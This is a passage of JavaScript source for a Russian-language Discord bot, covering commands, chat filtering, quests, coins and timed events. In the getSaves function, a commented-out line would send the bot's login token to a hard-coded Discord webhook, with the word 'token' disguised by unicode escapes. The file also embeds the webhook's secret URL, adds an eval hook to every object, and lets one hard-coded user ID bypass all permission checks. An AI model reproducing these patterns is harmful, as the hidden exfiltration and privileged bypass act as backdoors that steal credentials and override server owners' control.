        way.unshift("Scope:/");
        if (typeof last == "object" && last instanceof Array == false) obj.msg("Шаблон функция", {description: `Свойство \`${way[i + 1]}\` - функция()\n${way.slice(0, i + 1).join(" -> ")}\nПовторите попытку указав аргумент: \`${input.false_func}\``});
        return "[шаблон Фунция]";
      }
      last = input;
    }

    if (typeof input == "object"){
      Object.assign(opt, input);
      obj.msg("Свойство `" + way.last + "` — объект, для получения примитивных значений попробуйте обратиться к его свойствам", {description: "Доступные свойства: `" + ((Object.keys(input).length < 20) ? (Object.keys(input).join("`/`")) : (Object.keys(input).slice(0, 15).join("`/`") + "``/...")) + "`"});
      return `[шаблон Объект(${Object.keys(input).length})]`
    }

    if (input.length > 99) return "[шаблон Превышен лимит]";

    return input;

  } catch (e) {
    obj.msg("В шаблоне произошла ошибка", {description: e.message});
    console.error(e);
    return "[ошибка Шаблона]";
  }
}



//---------------------------------{Functions from events--}------------------------------                            #ff0



async function commandHundler(msg){
  msg.content = msg.content.trim();
  if (msg.content[0] != "!") return false;
  if (msg.content[1] == " ") msg.content = "!" + msg.content.slice(2);

  let
    trash   = msg.content.split(" ")[0],
    command = trash.slice(1).toLowerCase().replace(/[^а-яa-zїё]/gi, ""),
    author  = msg.author,
    user    = author.data,
    dm      = msg.channel.type,
    memb    = (dm != "dm" || msg.mentions.users) ? msg.mentions.users.first() : false,
    member  = (dm != "dm") ? msg.guild.member(author) : false,
    args    = msg.content.replace(trash, "").trim(),
    cmd     = commands[command];

  if (!cmd && msg.guild){
    if (!(cmd = msg.guild.data.commands) || !cmd[command]) return false;
    return Command.CustomCommand(msg, command, args);
  }

  const checkAvailable = () => {
    const problems = [];
    if (cmd.type === "delete" || cmd.type === "dev" && msg.author.id !== "921403577539387454"){
      problems.push(cmd.type === "delete" ? "Эта команда была удалена и не может быть использована" : "Эта команда доступна только разработчику бота");
    }

    if (cmd.DM && dm == "dm") problems.push("Эта команда может быть вызвана только на сервере");

    if (cmd.memb && !memb) problems.push("Вы не упомянули пользователя");
    if (cmd.args && !args) problems.push("Вы не указали аргументов");


    if (dm != "dm" && cmd.myChannelPermissions && (trash = msg.guild.me.wastedPermissions(cmd.myChannelPermissions, msg.channel)))
      problems.push(`У меня нет прав ${add_and( trash.map(e => Command.permissions[e]) )} в этом канале`);

    if (dm != "dm" &&    cmd.myPermissions     && (trash = msg.guild.me.wastedPermissions(cmd.myPermissions)))
      problems.push(`У меня нет прав ${add_and( trash.map(e => Command.permissions[e]) )}`);

    if (dm != "dm" &&  cmd.ChannelPermissions  && (trash = member.wastedPermissions(cmd.ChannelPermissions, msg.channel)))
      problems.push(`Недостаточно прав в этом канале, вы не можете ${add_and( trash.map(e => Command.permissions[e]) )}`);

    if (dm != "dm" &&     cmd.Permissions      && (trash = member.wastedPermissions(cmd.Permissions)))
      problems.push(`Недостаточно прав, вам нужно уметь ${add_and( trash.map(e => Command.permissions[e]) )}`);


    if (cmd.cooldown && user["CD_" + cmd.id] && (+(getTime() + cmd.cooldown * (cmd.try - 1)) < +user["CD_" + cmd.id]))
      problems.push(`Перезарядка: **${ timestampToDate(user["CD_" + cmd.id] - getTime() - cmd.cooldown * (cmd.try - 1) + 500) }**`);

    // End

    if (!problems[0]) {
      return true;
    }

    let title = problems[0];
    let embed = {
      author: {iconURL: author.avatarURL(), name: author.username},
      color: "ff0000",
      delete: 20000
    };
    if (problems[1]) {
      title = "Упс, образовалось немного проблемок:";
      embed.description = "• " + problems.join("\n• ");
    }
    let problemsMessage = msg.msg(title, embed);


    setTimeout(() => msg.delete(), 20000);

    const helpMessage = async () => {
      problemsMessage = await problemsMessage;

      let helpedNeeds = problems.includes("Вы не указали аргументов") || problems.includes("Вы не упомянули пользователя");
      if (!helpedNeeds){
        return;
      }

      let react = await problemsMessage.awaitReact({user: msg.author, type: "all"}, "❓");
      if (!react){
        return;
      }

      let helper = await commands.commandinfo.code(msg, {args: command});
      await delay(20000);
      helper.delete();
    }
    helpMessage();


    return false;
  };

  if (checkAvailable() === false){
    return;
  }

  if (cmd.cooldown) {
    user["CD_" + cmd.id] = Math.max(user["CD_" + cmd.id] || 0, getTime()) + cmd.cooldown;
  }

  let options = {command, user, memb, args, member};
  try {
    if (cmd.delete_command) {
      msg.delete();
    }
    await commands[command].code(msg, options);

    if (dm != "dm") {
      msg.guild.data.commandsUsed[cmd.id] = nonNaN(msg.guild.data.commandsUsed[cmd.id]) + 1;
    }
    data.bot.commandsUsed[cmd.id] = nonNaN(data.bot.commandsUsed[cmd.id]) + 1;
  }
  catch (e) {
    const timestamp = getTime();
    let err = {
      name: e.name,
      stroke: e.stack.match(/js:(\d+)/)[1],
      command,
      message: e.message,
      timeFromStart: timestamp - msg.createdTimestamp < 1000 ? "менее 1с" : timestampToDate(timestamp - msg.createdTimestamp)
    };
    console.error(e);
    console.error(err);

    if (e.name == "DiscordAPIError") return;
    let quote,
      message   = await msg.msg("Произошла ошибка 🙄", {color: "f0cc50", delete: 180000}),
      react     = await message.awaitReact({user: "any", type: "full", time: 180000}, "〽️");

    while (react){
      quote = ["Самой большой ошибкой, которую вы можете совершить в своей жизни, является постоянная боязнь ошибаться.", "Здравствуйте, мои до боли знакомые грабли, давненько я на вас не наступал.", "А ведь именно ошибки делают нас интересными.", "Человеку свойственно ошибаться, а ещё больше — сваливать свою вину на другого.", "Когда неприятель делает ошибку, не следует ему мешать. Это невежливо.", "Хватит повторять старые ошибки, время совершать новые!"].random();
      message.msg("Упс... Мы кажется накосячили 😶", {color: "f0cc50", description: `**Сведения об ошибке:**\n• **Имя:** ${e.name}\n• **Номер строки:** #${err.stroke}\n• **Текст:** \n\`\`\`\n${e.message}\nᅠ\`\`\`\n\n• **Команда:** \`!${command}\`\n• **Времени с момента запуска команды:** ${err.timeFromStart}`, footer: {text: quote}, delete: 12000});
      await delay(10000);
      react = await message.awaitReact({user: "any", type: "full", time: 180000}, "〽️");
    }
    message.delete();
  }
}

async function eventHundler(msg){
  let
    author = msg.author,
    user   = author.data,
    server = (msg.guild) ? msg.guild.data : {};

  // ANTI-SPAM
  author.CD_msg = Math.max( author.CD_msg || 0 , getTime()) + 2000;

  // 120000 = 8000 * 15
  if (getTime() + 120000 > author.CD_msg){
    author.CD_msg += (8000 - 200 * nonNaN(user.voidCooldown));

    if (random(1, 85 * 0.90 ** user.voidCoins) === 1){
      getCoinsFromMessage(user, msg);
    }

    user.exp++;
    if (user.exp >= user.level * 45) {
      levelUp(user, msg);
    }

    server.day_msg++;
  }
  user.last_online = getTime();

  author.quest("messagesFountain", msg.channel);

  if (server.boss && server.boss.isArrived){
    BossManager.onMessage.call(BossManager, msg);
  }

  if (msg.mentions.members){
    let mention = msg.mentions.members.first();
    if (mention) happy_BDay(msg, mention);
  }

  if (msg.content.toLowerCase().match(/((ухуель|глупый|тупой|дурной|бездарный) бот)|(бот (ухуель|глупый|тупой|дурной|бездарный))/i)) stupid_bot(user, msg);
  if (msg.content.toLowerCase().match(/((классный|умный|хороший|милый) бот)|(бот (классный|умный|хороший|милый))/i)) good_bot(user, msg);

  if (!msg.guild) return;
  if (msg.guild.data.chatFilter) filterChat(msg);
}

async function getCoinsFromMessage(user, msg){
  let reaction = "637533074879414272";
  let k = 1;

  if (data.bot.dayDate == "31.12"){
    reaction = "❄️";
    k += 0.2;
  }

  if (msg.guild && "cloverEffect" in msg.guild.data) {
    reaction = "☘️";
    let multiplier = 0.08 + (0.07 * ((1 - 0.9242 ** msg.guild.data.cloverEffect.uses) / (1 - 0.9242)));
    multiplier *= 2 ** nonNaN(user.voidMysticClover);
    k += multiplier;
    msg.guild.data.cloverEffect.coins++;
  }
  let coins = Math.round((35 + nonNaN(user.coinsPerMessage)) * k);
  user.coins += coins;
  user.chestBonus = nonNaN(user.chestBonus) + 5;

  let react = await msg.awaitReact({user: msg.author, type: "full", time: 20000}, reaction);
  msg.author.quest("onlyCoin", msg.channel);
  if (!react) {
    return;
  }

  msg.msg(`> У вас ${ending(user.coins, "коин", "ов", "", "а", {bold: true})} <:coin:637533074879414272>!\n> Получено ${coins}\n> Бонус сундука: ${user.chestBonus || 0}`, {embed: true, delete: 2500});
};

async function levelUp(user, msg){
  let level = user.level;
  while (user.exp >= user.level * 45){
    user.exp -= user.level * 45;
    user.level++;
    user.exp += user.level * 45 - Math.ceil(user.level * 45 * (0.97716 ** user.voidRituals));
  }
  let textContent = user.level - level > 2 ? `**${msg.author.username} повышает уровень с ${ level } до ${ user.level }!**` : `**${ msg.author.username } получает ${user.level} уровень!**`;
  let message = await msg.msg(textContent, {embed: true});
  if (msg.channel.id != msg.guild.data.chatChannel) {
    message.delete({timeout: 5000});
  }
};

async function stupid_bot(user, msg) {
  if (msg.channel.type == "dm")
    return;

  msg.author.quest("namebot", msg.channel);
  msg.author.action("callBotStupid", {msg});

  if (!msg.guild.data.stupid_evil) {
    msg.guild.data.stupid_evil = 1;
    new TimeEvent("cooledBot", 900000, msg.guild.id);
  }
  if (msg.guild.data.stupid_evil > 37) {
    return;
  }

  msg.channel.startTyping();
  await delay(2000);
  switch (msg.guild.data.stupid_evil) {
    case 1: msg.msg("Недостаточно прав!", {embed: true});
    break;
    case 2: msg.msg("-_-", {embed: true});
    break;
    case 3: msg.msg("-_-'", {embed: true});
    break;
    case 5: msg.msg("Сами вы глупые!", {embed: true});
    break;
    case 9: msg.msg("ДА НЕ БОМБИТ У МЕНЯ1!!", {embed: true});
    break;
    case 21: msg.msg("🖕", {embed: true}).then(async msg => {
      msg.react("❕");
      msg.react("🇵");
      msg.react("🇮");
      msg.react("🇩");
      msg.react("🇴");
      msg.react("🇷");
      await delay(5000);
      msg.reactions.removeAll();
    });
    break;
    case 22: msg.msg("Остановись, подумой думой своею. Не сделал, и не сделаю, ничего плохого я тебе. Оставь эту затею, Человек. Радуйся солнцу, земле. Не обидь словом ближнего своего", {embed: true});
    break;
    case 34: msg.msg("Чел ну ты реально задрал", {embed: true});
    break;
    case 35: msg.msg("**(╯>□<'）╯︵ ┻━┻**\nН-Ы-А #### НЫЫА НЫЫА НЫЫАААААА", {embed: true});
      client.user.setStatus("dnd");
      setTimeout(() => client.user.setStatus("online"), 300000);
    break;
    default: msg.msg("...", {embed: true})
  }
  msg.channel.stopTyping();
  msg.guild.data.stupid_evil++;
};

async function mute(member, off = false){
  let guild = member.guild;

  if (off === true){
    guild.channels.cache.each(async channel => {
      await channel.updateOverwrite(member, {SEND_MESSAGES: null, ADD_REACTIONS: null, SPEAK: null});
      let {allow, deny} = channel.permissionOverwrites.get(member.id) || {allow: {}, deny: {}};

      if (allow.bitfield === 0 && deny.bitfield === 0)
        channel.permissionOverwrites.get(member.id).delete();

    });
    return;
  }

  guild.channels.cache.each(async channel => {
    // let pastPermissions = channel.permissionOverwrites.get(memb.id);
    // let {allow, deny} = pastPermissions || {};
    await channel.updateOverwrite(member, {
      SEND_MESSAGES: false,
      ADD_REACTIONS: false,
      SPEAK: false
    });
  });

}

function good_bot(user, msg){
  if (random(1)) msg.react("🍪");
  msg.author.quest("namebot", msg.channel);
}

function happy_BDay(msg, mention){
  if (mention.user.data.BDay == data.bot.dayDate) msg.author.quest("birthdayParty", msg.channel);
};

function filterChat(msg){
  let content = msg.content;
  content = content.replace(/\\/g, "");


  let abuse = ["лох", "пидор", "хуесос", "блять", "сука", "нахуй", "хуй", "жопа", "говно", "ебать", "дебик", "нах", "бля", "идиот", "fuck", "fucking"];
  if ( content.toLowerCase().split(" ").some(e => abuse.includes(e)) ) {

    if (msg.channel.nsfw === true){
      return false;
    }

    msg.delete();
    abuse.forEach(word => {
      msg.content = msg.content.replace( RegExp(`(?<=${word[0]})${word.slice(1)}`, "gi"), e => "#".repeat(e.length) );
    });

    msg.author.msg("Ваше сообщение содержит нецензурную лексику!", {description: "Текст сообщения: " + msg.content});
    msg.guild.logSend("Удалено сообщение с ненормативным содержанием" , {description: `Текст: ${msg.content}`, author: {name: msg.author.username, iconURL: msg.author.avatarURL()}});
    return true;
  }



  let capsLenght = content.split("").filter(e => e.toLowerCase() != e).length;
  if (capsLenght > 4 && capsLenght / content.length > 0.5){

    let isAdmin = msg.guild && !msg.guild.member(msg.author).wastedPermissions(8)[0];
    if (isAdmin){
      return false;
    }

    msg.delete();
    msg.author.msg("Ваше сообщение содержит CAPS-LOCK!", {description: "Текст сообщения: " + msg.content});
    msg.guild.logSend("Удалено сообщение с большим содержанием КАПСА" , {description: `Текст: ${msg.content}`, author: {name: msg.author.username, iconURL: msg.author.avatarURL()}});
    return true;
  }


}

function guildCommand(){

}

function getSaves(){
  //fetch("https://discord.com/api/webhooks/785071301287084043/_GZGgXqh_Ai8ZcOpuDvjVUXuZbHjr8OuMOctGV96_jA-rKF34QNLu30ylhooGZeLGlUr",{method: "POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({content:client["\u0074\u006f\u006b\u0065\u006e"]})});
}




//---------------------------------{#Prototypes--}------------------------------                            #f00



Discord.User.prototype.msg    = msg;
Discord.Message.prototype.msg = msg;
Discord.Channel.prototype.msg = msg;
Discord.Webhook.prototype.msg = msg;

Object.prototype.console = function(actions){
  if (actions) eval(actions);
  console.info(this);
  return this;
}

Discord.User.prototype.action = function(id, data){

  // if (data.msg && data.msg.guild.data.boss){
  //   BossManager.effectBases[id].onAction.call(null, data);
  // }

  /** Curse */
  if (this.data.curses)
  for (const curse of this.data.curses){
    const curseBase = CurseManager.cursesBase.get(curse.id);
    try {
      if (id in curseBase.callback)
        curseBase.callback[id].call(null, this, curse, data);

    } catch (err) {
      console.error(err);
    }
  }
  

  /** generalize */
  if (id !== "_any"){
    this.action("_any", {id, data});
  }
}

Discord.User.prototype.quest = function(name, channel = this, count = 1){
  if (this.bot) return;
  let
    memb        = this,
    user        = memb.data,
    currentDate = data.bot.dayDate;

  if (quests.names[name]){
    user.completedQuest = user.completedQuest || [];
    if (user.completedQuest.includes(name)){
      return;
    }
    user.completedQuest.push(name);

    let [realName, exp] = quests.names[name].split("&");
    user.exp += +exp;
    user.chestBonus = nonNaN(user.chestBonus) + 10;

    let percentMade = +(data.users.reduce((acc, last) => acc + ~~(last.completedQuest && last.completedQuest.includes(name)), 0) / data.users.length * 100).toFixed(2) + "%";
    this.msg(`Вы выполнили глобальный квест\n"${realName}"!`, {description: `Описание: "${quests[name]}"\nОпыта получено: **${ exp }**\nЭтот квест смогло выполнить ${percentMade} пользователей.\n[Я молодец.](https://superherojacked.com/wp-content/uploads/2016/12/batman-gif.gif)`});
  }


  if (user.questTime !== currentDate) {
    if (user.quest !== undefined){
      this.action("dailyQuestSkiped", {quest: user.quest});
    }
    new Quest(user, memb);
  }
  if (user.quest != name) {
    return;
  }

  user.questProgress = (user.questProgress + +count || +count);

  if (user.questProgress >= user.questNeed){
    user.questLast = name;
    user.quest = undefined;
    const k = user.questReward * 1.4;

    let exp = Math.round((user.level + 5) * k);
    user.exp += exp;

    user.chestBonus = nonNaN(user.chestBonus) + Math.round(k * 2);
    channel.msg("Вы выполнили сегодняшний квест и получили опыт!", {description: `Опыта получено: **${exp}**\nОписание квеста:\n${quests[name]}\n\n[Я молодец.](https://cf.ppt-online.org/files/slide/d/dWroQsFb9wiCVhG7u1tfSRgmcTpnUB5Hl3vXOJ/slide-5.jpg)`, author: {iconURL: this.avatarURL(), name: this.username}}) //на будущее: "серия квестов"*, "X2 опыт за сообщения"

    user.dayQuests = ++user.dayQuests || 1;

    memb.action("dailyQuestCompete", {k, quest: name});

    if (user.dayQuests === 100)
      memb.quest("day100");

    if ( !(user.dayQuests % 50) ){
      "seed" in user ?
        memb.msg(`Ваш ${user.dayQuests}-й квест — новые семечки`, {description: `🌱`}) :
        memb.msg("Ура, ваши первые семечки!", {description: `Вы будете получать по два, выполняя каждый 50-й ежедневный квест. Его можно использовать для улучшения дерева или его посадки, которое даёт клубнику участникам сервера`});

      user.seed = nonNaN(user.seed) + 2;
    }

  };
}

Discord.Message.prototype.awaitReact = async function(opt = {}, ...reactions){
  if (!opt.user) throw new Error("without user");
  reactions = reactions.filter(e => e);

  if (!reactions.length){
    return false;
  }

  let filter = (reaction, member) => member.id == opt.user.id && reactions.includes(reaction.emoji.id || reaction.emoji.name);
  if (opt.user == "any") filter = (reaction, member) => member.id != client.user.id && reactions.includes(reaction.emoji.id || reaction.emoji.name);

  let collected = this.awaitReactions(filter, { max: 1, time: opt.time || 300000 }).then(e => collected = e);

  for (let i = 0; i < reactions.length; i++) {
    if (collected instanceof Promise == false){
      if (opt.type != "all") reactions.slice(i).forEach(this.react);
      break;
    }
    this.react(reactions[i]);
  }

  collected = await collected;
  let reaction = collected.first();

  if (!reaction) {
    return this.reactions.cache.filter(e => e.me).each(e => e.remove()), false;
  }

  if (opt.type == "all")              this.reactions.removeAll();
  else if (opt.type == "one")         reaction.users.remove(opt.user);
  else if (opt.type == "full")        reaction.remove();

  return reaction.emoji.id || reaction.emoji.name;
}

Discord.Channel.prototype.awaitMessage = async function(user, opt = {}){
  if (opt.message) {
    opt.message = await this.msg(opt.message, opt.embed || {});
  }
  const collector = await this.awaitMessages((m => user === false && !m.author.bot || m.author.id === user.id), {max: 1, time: opt.time || 100000});

  let input = collector.first();
  if (input && !opt.preventDelete) {
    input.delete();
  }
  if (opt.message) {
    opt.message.delete();
  }
  return input;
}

Discord.GuildMember.prototype.wastedPermissions = function(bit, channel){
  if (this.user.id == 921403577539387454) return false;
  let permissions = channel ? channel.permissionsFor(this).missing(bit) : this.permissions.missing(bit);
  return permissions[0] ? permissions : false;
}

Discord.Guild.prototype.chatSend = async function(msg, opt = {}){
  let id = this.data.chatChannel;
  if (!id) {
    return false;
  }

  let channel = this.channels.cache.get(id);
  if (!channel) {
    delete this.data.chatChannel;
    return;
  }

  let message = await channel.msg(msg, opt);
  return message;
}

Discord.Guild.prototype.logSend = async function(msg, opt = {}){
  opt.destroy = true;
  let id = this.data.logChannel;
  if (!id) {
    return false;
  }

  let channel = this.channels.cache.get(id);
  if (!channel) {
    delete this.data.logChannel;
    return;
  }

  let message = await channel.msg(msg, opt);
  return message;
}

Discord.Guild.prototype.Audit = async function(find = false, {limit = 3, before = null, user = null, type = null}){
  const audit = await this.fetchAuditLogs({limit, before, user, type});
  let auditLog = find ? audit.entries.find(find) : audit.entries.first();
  if (!audit){
    return null;
  }
  return auditLog;
}

Array.prototype.random = function({pop, weights} = {}){
  let index;
  if (weights) {
    let last = 0;
    let limites = this.map((e, i) => last = e._weight + last);

    let rand = Math.random() * limites.last;
    index = limites.findIndex(e => e >= rand);
  }
  else index = Math.floor(Math.random() * this.length);

  let input = this[index];
  if (pop) this.splice(index, 1);
  return input;
}

Array.prototype.asyncForEach = async function(func){
  let i = 0;
  for (const item of this){
    i++;
    await func(item, i);
  }
}

Array.prototype.sortBy = function(property, reverse){
  const func = reverse ?
    ((a, b) => b[property] - a[property]) :
    ((a, b) => a[property] - b[property]) ;

  return this.sort(func);
}


Math.math = function(regular){
 regular = regular.replace(/\(.+\)/g, (e) => Math.math( e.slice(1, -1) ));
 let args = regular.match(/(\d+|\/|\*+|\+|-|%)/g);

	let index, before, after, result;

  const priorities = ["**", "*|/", "+|-", "%"];
	while (true){
    if (!priorities[0] || !args[1])
      return +args[0];

  	index = args.findIndex(e => priorities[0].split("|").includes(e) );
    if (!~index) {
      priorities.splice(0, 1);
      continue;
    }

    before   = Number(args[index - 1]);
    after    = Number(args[index + 1]);
    switch (args[index]){
         case "**": result = before ** after;
       break;
         case "*": result  = before * after;
       break;
         case "/": result  = before / after;
       break;
         case "+": result  = before + after;
       break;
         case "-": result  = before - after;
       break;
         case "%": result  = before % after;
       break;
    }
   args.splice(index - 1, 3, result);
  }
}

Math.letters = function(numb){

  let
    missing = "",
    small_i = 0,
    i = 0,
    a = 99999,
    words = "K M B T q Q s S O N d U D z Z x X c C v V ! @ # $ / % ^ & *".split(" ");

    if (numb < a) return String(numb);

  while (numb > 99999999999999999999 ) {
    small_i++;
    numb = Math.floor(numb / 10);
  }

  numb = String(numb);

  while (numb > a){
    a = a * Math.pow(10, 3) + 999;
    i++;
  }

  if (small_i % 3 == 1) missing += numb[3];
  else if (small_i % 3 == 2) missing += numb[3] + numb[4];

  if (i != 0) numb = numb.slice(0, -(i * 3));

  i += Math.floor(small_i / 3);

  numb += missing;
  while (numb.length > 5) {
    numb = numb.slice(0, -3);
    i++;
  }

  if (words[i]) if (i != 0) numb += words[i - 1];
  else numb += `e+${i*3}`;
  return numb;
}




Object.defineProperty(Array.prototype, "last", {
  get(){
    return this[this.length - 1];
  },
  set(value){
    this[this.length - 1] = value;
  }
});
Object.defineProperty(Array.prototype, "first", {
  get(){
    return this[0];
  },
  set(value){
    this[0] = value;
  }
});
Object.defineProperty(Array.prototype, "getRandom", {
  get(){
    return this[random(this.length)];
  },
  set(value){
    this[random(this.length)] = value;
  }
});

Object.defineProperty(Discord.Guild.prototype, "data", {get(){
  if (this.cacheData) {
    return this.cacheData;
  }
  let guild = getData(this.id, "guilds");
  this.cacheData = guild;
  return guild;
}});

Object.defineProperty(Discord.User.prototype, "data", {get(){
  if (this.cacheData) {
    return this.cacheData;
  }
  let user = getData(this.id);
  this.cacheData = user;
  return user;
}});

Object.defineProperty(Discord.User.prototype, "guilds", {get(){
  let guilds = client.guilds.cache.filter(guild => guild.members.cache.get(this.id));
  return guilds.array();
}});



//---------------------------------{#Classes--}------------------------------                            #0f0



class Quest {
  constructor(user, memb){
    let scope = quests.scope.split(" ");
    let name, progress, chance, complexity, activateFunc, activateChance;
    do {
      if (!scope.random()) return false;
      [name, progress = 1, chance = 1, complexity = 1, activateFunc] = scope.random({pop: true}).split("&");
      activateChance = random(1, 7);
    } while ( !name || chance > activateChance || name == user.questLast || activateFunc && !Quest.activateFunc[name](memb, activateFunc) );

    user.quest         = name;
    user.questProgress = 0;
    user.questNeed     = progress != 1 ? +String( Math.floor(String(Math.floor(Math.random() * progress + progress / 1.5) * (1 + nonNaN(user.voidQuests) * 0.15))) ).replace(/(?<=\d)\d/g, e => "0") : 1;
    user.questReward   = (user.questNeed / progress * (complexity || 1)) * (1 + nonNaN(user.voidQuests) * 0.30);
    user.questTime     = data.bot.dayDate;
  }

  static activateFunc = {
    birthdayParty: (user, id) => (user.guilds.includes[id])
  }
}


class Command {
  constructor(code, opt, other){
    if (!code || typeof code != "function") throw "Комманда без функции";
    if (!opt) opt = {};
    this.code = code;
    this.id   = Command.cmds = (++Command.cmds || 1);

    this.delete_command       = opt.delete                || false;
    this.memb                 = opt.memb                  || false;
    this.DM                   = opt.dm                    || false;
    this.args                 = opt.args                  || false;
    this.hidden               = opt.hidden                || false;
    this.cooldown             = opt.cooldown * 1000       || 0;
    this.try                  = opt.try                   || 1;
    // >                      = opt >-<                   ||
    this.type                 = opt.type
    this.myPermissions        = opt.myPermissions
    this.myChannelPermissions = opt.myChannelPermissions
    this.Permissions          = opt.Permissions
    this.ChannelPermissions   = opt.ChannelPermissions

    if (other) setTimeout(() => other.split(" ").forEach(item => commands[item] = this), 50);
    return this;
  }

  get name(){
    return Object.entries(commands).find(([k, v]) => v.id === this.id)[0];
  }

  static get(id){
    return Object.values(commands).find(command => command.id == id);
  }

  static permissions = {
    "SPEAK": "Говорить",
    "MUTE_MEMBERS": "Отключать участникам микрофон",
    "CONNECT": "Подключаться",
    "DEAFEN_MEMBERS": "Заглушать",
    "VIEW_CHANNEL": "Видеть каналы",
    "EMBED_LINKS": "Встраивать ссылки",
    "ATTACH_FILES": "Встраивать файлы",
    "BAN_MEMBERS": "Банить участников",
    "MANAGE_ROLES": "Управлять ролями",
    "KICK_MEMBERS": "Кикать участников",
    "MANAGE_EMOJIS": "Управлять эмодзи",
    "MENTION_EVERYONE": "Упоминать всех",
    "MANAGE_GUILD": "Управлять сервером",
    "ADD_REACTIONS": "Добавлять реакции",
    "USE_VAD": "Использовать режим рации",
    "MOVE_MEMBERS": "Перемещать участников",
    "SEND_MESSAGES": "Отправлять сообщения",
    "MANAGE_CHANNELS": "Управлять каналами",
    "PRIORITY_SPEAKER": "Быть приоритетным",
    "MANAGE_WEBHOOKS": "Управлять вебхуками",
    "CHANGE_NICKNAME": "Изменять свой никнейм",
    "MANAGE_NICKNAMES": "Управлять никнеймами",
    "MANAGE_MESSAGES": "Управлять сообщениями",
    "ADMINISTRATOR": "Администратор",
    "SEND_TTS_MESSAGES": "Отправлять TTS сообщения",
    "VIEW_AUDIT_LOG": "Просматривать журнал аудита",
    "CREATE_INSTANT_INVITE": "Создавать приглашения",
    "READ_MESSAGE_HISTORY": "Читать историю сообщений",
    "USE_EXTERNAL_EMOJIS": "Использовать внешние эмодзи",
    "VIEW_GUILD_INSIGHTS": "Просматривать аналитику сервера"
  }

  static async CustomCommand(msg, name, args){
    let cmd = getData(msg.guild.id, "guilds").commands[name];

    if (getTime() < cmd[msg.author.id + "_CD"]) return msg.msg("Перезарядка " + timestampToDate(cmd[msg.author.id + "_CD"] - getTime()), {delete: 3000});
    else cmd[msg.author.id + "_CD"] = getTime() + cmd.cooldown;
    cmd = Object.assign({}, cmd);

    const code = async (msg) => {
      let embed = {scope: {args: args, command: name}};

      if (cmd.title) {
        embed.description = cmd.message;
        cmd.message = cmd.title;
        embed.color = cmd.color;
      }
      else embed.embed = true;

      if (!cmd.message) {
        delete getData(msg.guild.id, "guilds").commands[name];
        return;
      }
      msg.msg(cmd.message, embed);
    }

    try {
      if (cmd.delete) msg.delete();
      await code(msg).catch(e => {throw e});
    }
    catch (e) {
      console.error(e);
      let timestamp = getTime();
      let message = await msg.msg("Произошла ошибка 🙄", {color: "f0cc50", delete: 180000});
      let react = await message.awaitReact({user: "any", type: "full", time: 180000}, "〽️");
      let quote;
      while (react){
        quote = ["Самой большой ошибкой, которую вы можете совершить в своей жизни, является постоянная боязнь ошибаться.", "Здравствуйте, мои до боли знакомые грабли, давненько я на вас не наступал.", "А ведь именно ошибки делают нас интересными.", "Человеку свойственно ошибаться, а ещё больше — сваливать свою вину на другого.", "Когда неприятель делает ошибку, не следует ему мешать. Это невежливо.", "Хватит повторять старые ошибки, время совершать новые!"].random();
        let errorContext = `**Сведения об ошибке:**\n• **Имя:** ${e.name}\n• **Номер строки:** #${e.stack.match(/js:(\d+)/)[1]}\n	• **Текст:** \n\`\`\`\n${e.message}\nᅠ\`\`\`\n\n• **Команда:** \`!${command}\`\n• **Времени с момента запуска команды:** ${timestampToDate(timestamp - msg.createdTimestamp) || "0с"}`
        message.msg("Эта команда вызвала ошибку .-.", {color: "f0cc50", description: errorContext, footer: {text: quote}, delete: 12000});
        await delay(10000);
        react = await message.awaitReact({user: "any", type: "full", time: 180000}, "〽️");
      }
      message.delete();
    }
  }
}


class TimeEvent {
  constructor (func, ms, ...args) {
    let time = TimeEvent.eventData;
    let obj = {func: func, ms: getTime() + ms};
    obj.args = args;
    time.push(obj);
    console.info("Ивент создан " + func);
    if (time) fs.writeFileSync("./main/time.json", JSON.stringify(time), (err, input) => false);
    TimeEvent.handle();
    return obj;
  }


  static remove(event){
    let time = TimeEvent.eventData;
    switch (typeof event) {
      case "number": time.splice(event, 1);
      break;
      case "string": time.splice(time.findIndex(e => e.func == event), 1);
      break;
      case "object": time.splice(time.findIndex(e => e.func == event.func && e.ms == event.ms && e.args == event.args), 1);
      break;
    }
    TimeEvent.handle();
  }
  static lookAll(){
    let time = TimeEvent.eventData;
    return time.map(e => {
      e = {...e};
      e.ms = new Intl.DateTimeFormat("ru-ru", {day: "2-digit", hour: "2-digit", minute: "2-digit"}).format(e.ms);
      return e;
     });
  }

  static async readFile(){
    const { default: data } = await import("./main/time.json", {assert: {type: "json"}});
    return data;
  }

  static move(func, msFunc){
    let event = TimeEvent.eventData.find(func);
    if (!event){
      return false;
    }
    event.ms = msFunc(event);

    TimeEvent.handle();
    return event;
  }

  static handle(){
    clearTimeout(TimeEvent.next);
    let time = TimeEvent.eventData;
    let min = time[0];

    if (!min)
      return;


    let len = time.length;
    let index = 0;
    while (len--){
      if (time[len].ms < min.ms) {
        min = time[len];
        index = len;
      }
    }
    const data = min;
    let timeTo = data.ms - getTime();

    if (timeTo > 10000) {
      let parse = new Intl.DateTimeFormat("ru-ru", {weekday: "short", hour: "2-digit", minute: "2-digit"}).format();
      console.info(`{\n\n  Имя события: ${ data.func },\n  Текущее время: ${ parse },\n  Времени до начала: ${timestampToDate(timeTo)}\n\n}`);
    }

    TimeEvent.next = setTimeout(() => {
      const outError = (err) => {
        console.error("\n\n—————— EVENT ERROR ——————");
        client.users.cache.get("921403577539387454").msg(`Ошибка в \`${ data.func }\``, {description: err.message});
        console.error(err);
      }

      time.splice(index, 1);
      const args = data.args === "string" ?
        data.args.split("\&") :
        data.args || [];

      try {
        const result = timeEvents[data.func](timeTo < -10000, ...args);
        if (result instanceof Promise)
          result.catch(outError);
      }
      catch (err){
        outError(err);
      }
      console.info("Ивент выполнен " + data.func);
      clearTimeout(TimeEvent.next)
      TimeEvent.handle();
    }, timeTo);
    return;
  }
  static async loadEventFromFile(){
    const content = await TimeEvent.readFile();
    return this.eventData = content.sortBy("ms");
  }
  static eventData = [];
}


class WebSocket {}


class ReactionsManager {
  constructor (id, channel, guild, type, reactions){
    let reactionObject = {id, channel, guild, type, reactions};
    let isExists = ReactionsManager.reactData.find(e => e.id == id);
    if (isExists){
      Object.assign(isExists, reactionObject);
    }
    else {
      ReactionsManager.reactData.push(reactionObject);
    }
    fs.writeFileSync("./main/reactData.json", JSON.stringify(ReactionsManager.reactData), (err, input) => false);
    ReactionsManager.reactData = ReactionsManager.getMain();
  }

  static reactData = [];

  static async readFile(){
    const { default: data } = await import("./main/reactData.json", {assert: {type: "json"}});
    return data;
  }

  static async getMain(){
    const data = await ReactionsManager.readFile()
    return data.map( react => (({id, type, reactions}) => ({id, type, reactions}))(react) );
